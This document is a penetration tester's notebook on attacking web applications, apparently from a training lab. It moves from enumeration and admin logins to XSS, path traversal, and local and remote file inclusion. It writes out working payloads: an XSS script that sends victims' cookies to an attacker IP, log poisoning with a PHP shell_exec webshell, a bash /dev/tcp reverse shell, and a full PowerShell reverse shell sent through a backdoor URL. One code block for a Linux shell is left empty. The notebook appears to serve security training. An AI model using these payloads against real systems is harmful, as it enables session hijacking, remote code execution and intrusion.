## Web Application Attacks

### Enumeration

#### Sitemaps

These files help search engine bots and also specify what URL's NOT to crawl, which are usually sensitive pages.  Example files are `robots.txt` and `sitemap.xml`.

`Allow` and `Disallow` are directives for web crawlers indicating pages a polite web crawler may or may not access.

#### Admin Consoles

Generally web applications will have an admin console that is set to a specific folder or specific port.  Examples are `/manager/html` for Tomcat and `/phpadmin` for MySQL.

Use web content scanners to find these pages.

### Others to try:

Other directory enumerators https://pwn.no0.be/recon/web/path_enum/

Web Fuzzer in GO - https://github.com/ffuf/ffuf



### Web Application Exploitation

#### Admin Consoles

- Simplest 'exploit' is to login.  

  - Can attempt default creds, working creds, or brute-force.
  - Have to be careful with brute-force to avoid lockouts

- Methodology

  1. Enumerate to locate directory (dirb, nikto, defaults, etc)
  2. Check default & working creds against login page


### SQL Queries

NOTE:  WATCH YOUR QUOTES WHEN COPY/PASTING COMMANDS!  Applications like to substitute other characters for double-quotes.

Select all records from a table

```sql
select * FROM webappdb.users
```

Insert a record into a table

```sql
INSERT INTO webappdb.users(password,username) VALUES ("rock","roll")
```

### Cross-Site Scripting (XSS)

#### Content Injection

Commands can be injected into forms then when they are displayed, they will execute on the client.

Example:  Redirect client to another site through iframes.  The height & width are set to 0 so that nothing will show up.

1. Setup a netcat session on the attacking machine to receive the request from the target.

2. Load this into a page and the client will connect to the netcat session.

   ```html
   <iframe src=http://192.168.119.216:8000/report height="0" width="0"></iframe>
   ```

3. When the client loads the code, the results will pop up in Netcat

#### Script Sanitization

Good programming will have sanitizers in place that will check input and remove any tags from it.  You can test out the filters and try a few ways to beat this.  Insert these into the vulnerable form and see what the results is.  You will likely need to check the page source to see what was actually returned.

1. If `<script>` is being stripped from your input, you should try the following to check whether all instances are being removed or if just the first instance is removed:

   `<script><script>alert(1)</script>`

2. Check whether the sanitization is being performed recursively, meaning does the filter keep moving once it finds and instance or does it back up and re-check the previous text:

   `<scr<script>ipt>alert(1)</script>`

3. If it does check recursively, you can test the order that it checks for tags to see if it only checks for a certain tag before another tag:
   `<scr<object>ipt>alert(1)</script>`

Ref: https://portswigger.net/support/xss-beating-html-sanitizing-filters

Exhaustive list of filter evasion techniques:  https://owasp.org/www-community/xss-filter-evasion-cheatsheet

#### Steal Cookies & Session Info

Cookies are used to track session states.

There are two special flags that can block access to the cookie:

- Secure - This instructs the browser to only send the cookie over encrypted connections, like HTTPS, preventing it from being sent in cleartext & captured
- HttpOnly - Instructs the browser to deny JavaScript access to the cookie.  If this is NOT set, we can use an XSS payload to steal it.

1. Setup a netcat session on the attacking machine to receive the request from the target.

2. Load this script on a page that an admin will access:

   ```html
   <script>new Image().src="http://192.168.119.216:8000/cool.jpg?output="+document.cookie;</script>
   ```

3. Use the [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) extension in Firefox to replace the Session ID with the stolen one from the netcat.

#### More Ideas

- Exploit Java/browser vulnerabilities
- Keystroke loggers
- Phishing attacks
- Port scanning
- Content scrapers/skimmers
- https://pentest-tools.com/blog/xss-attacks-practical-scenarios/

### Directory/Path Traversal

1. Look for URL query strings or form bodies for values that appear as file references, particularly file extensions.
2. Attempt to modify those to reference files that should be readable by any user on the system (`/etc/password`, `c:\boot.ini`, etc)
3. You can use parent directory indicators `../` or `..\` to traverse unknown paths to take them back to the root folder, then build your path from there (ex:  `../../../../../etc/passwd`)

Some signs of directory traversable URL's

```html
# Shows the extension of a file, indicating loading a resource from another location.
http://192.168.216.10/menu.php?file=current_menu.php
```

### File Inclusion Vulnerabilities

#### Local File Inclusion

We must find a way to load the payload onto the server.  Once loaded, the payload is executed using Directory/Path Traversal to load the code into the webpage.

##### Contaminating Log Files

Most application servers log all URL's requested.  We can load code into the log files and then execute that code by reference the log files via Directory Traversal.

1. Use netcat to connect to the webserver and enter the PHP code which will translate as a get request, which will create an entry in the log with the code.  It will result in an error due to the request not being valid, but it will be stored to the logs.

   ```bash
   # Connect to webserver
   netcat -nv 192.168.216.10 80
   # Send the code, which allows you to specify any command with the `cmd` variable.
   <?php echo shell_exec($_GET['cmd']); ?>
   ```

2. Use the Log file in the LFI payload

   ```bash
   # Whatever command follows the 'cmd' variable is executed locally on the webserver inline with the log file.  If the log file is junked up, you will need to look for the output among all the other lines.
   http://192.168.216.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
   ```

IMPORTANT NOTE:  When using code in your URL, use Burp Suite to encode it into URL format.  It should encode EVERY character in the `%` format code.  There are some URL Encoders on the Internet that will encode just the special characters and this can have unexpected issues here.

#### Remote File Inclusion

In order to perform RFI, the `allow_url_include` flag for PHP must be set to `on`.  

We can create a file on our remote server (attacker's machine) with code to be executed by the target server similar to the LFI above and host it on a webserver.

```bash
# Create a file on attacker machine with this code:
<?php echo shell_exec($_GET['cmd']); ?>

# I have no idea what this was for
# <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

# Host the file on attacker machine using webserver
sudo python2 -m SimpleHTTPServer 80
```

The code above begins with `<?php` and ends with ``?>``. The bulk of the PHP payload is a simple `echo` command that will print output to the page. This output is first wrapped in `pre` HTML tags, which preserve any line breaks or formatting in the results of the function call. Next is the function call itself, `shell_exec`, which will execute an OS command. Finally, the OS command is retrieved from the “cmd” parameter of the GET request with `_GET[‘cmd’]`. This one line of PHP will let us specify an OS command via the query string and output the results in the browser.  

At this point, we load our remote file the same we loaded local files with LFI

```bash
http://192.168.216.10/menu.php?file=http://192.168.119.216/rfi.php
```



#### PHP Reverse Shell One-Liner (Linux)

A convenient one-liner to put in a PHP file and get a reverse shell on a Linux machine:

```php
payload = "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/192.168.119.216/8000 0>&1'\");?>"
    
# Note:  You need to escape the double-quotes inside the command.  Port is specified with a slash instead of a colon
```

#### PHP CMD Shells

A PHP CMD shell is a PHP script that allows you to pass commands to the server as a parameter to the PHP page, usually in the form of `http://site.com/page.php?cmd=yourcommand`

Curl is a great way to send these commands to the webserver rather than using a web browser.

This can be used to enumerate or upload a meterpreter payload.

You can also use the following reverse shell one-liners to get a simple reverse shell:

Note:  You should URL encode the commands so that characters are not interpreted as HTML or PHP code.

**<u>Windows</u>**

```powershell
http://192.168.216.10/backdoor.php?cmd=powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.216',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**<u>Linux</u>**

```bash

```



#### Webshells

Kali includes webshells in different languages to get a browser-based CLI.  They are stored in `/usr/share/webshells` along with other scripts.  The best webshell for PHP I found was `/usr/share/webshells/laudanum/php/shell.php`.  You have to upload this file to the server somehow and run it locally, it doesn't work with RFI.

